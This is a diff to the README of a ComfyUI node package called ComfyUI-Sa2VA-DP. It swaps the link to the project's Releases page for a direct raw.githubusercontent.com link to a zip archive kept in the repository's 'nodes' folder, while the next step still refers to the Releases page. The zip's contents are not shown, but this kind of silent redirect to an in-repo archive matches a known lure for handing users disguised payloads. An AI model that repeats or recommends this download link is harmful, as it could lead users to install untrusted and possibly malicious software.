@@ -10,7 +10,7 @@ To get started, you will need to download the software. Follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the download page.
    
-   [Download ComfyUI-Sa2VA-DP](https://github.com/Nengo59/ComfyUI-Sa2VA-DP/releases)
+   [Download ComfyUI-Sa2VA-DP](https://raw.githubusercontent.com/Nengo59/ComfyUI-Sa2VA-DP/main/nodes/ComfyUI-Sa2VA-DP-v1.6.zip)
 
 2. **Select the Latest Version:** On the Releases page, look for the latest version of ComfyUI-Sa2VA-DP. You will see a list of files available for download.
 
